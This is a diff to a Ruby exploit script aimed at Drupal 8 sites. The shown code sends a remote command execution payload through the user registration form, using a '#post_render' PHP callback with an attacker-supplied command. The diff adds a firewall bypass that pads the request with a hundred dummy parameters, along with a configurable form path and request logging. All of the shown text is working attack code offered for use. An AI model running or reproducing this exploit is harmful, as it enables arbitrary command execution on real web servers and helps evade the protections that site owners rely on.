@@ -89,6 +89,7 @@ class Target
     @php_method = php_method
     @command    = command
     @uri        = URI.parse(host)
+    @cf_bypass  = cf_bypass
 
     @form_path = form_path
     @http      = create_http
@@ -147,15 +148,28 @@ class Drupal8 < Target
   def exploit
 
     # Make the request
-    post_path = "#{@uri.path}user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"
+    params = 'element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax'
+    if @cf_bypass
+      params = 'a=&'*100 + params
+    end
+
+    post_path = "#{@uri.path}#{@form_path}/?#{params}"
+    
+    puts info("Requesting: #{post_path}")
     req       = Net::HTTP::Post.new(URI.encode(post_path))
-    req.body  = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" +
+    req.body  = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + 
                 @php_method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command
 
-    res = @http.request(req)
-    is_response_200?(res)
-    puts res.body.split('[{"command"')[0]
+    if @cf_bypass
+      req.body = 'a=&'*100 + req.body
+    end
 
+    puts info("POST: #{req.body}")
+    res = @http.request(req)
+
+    if is_response_200?(res) then 
+      puts res.body.split('[{"command"')[0]
+    end
   end
 end
 
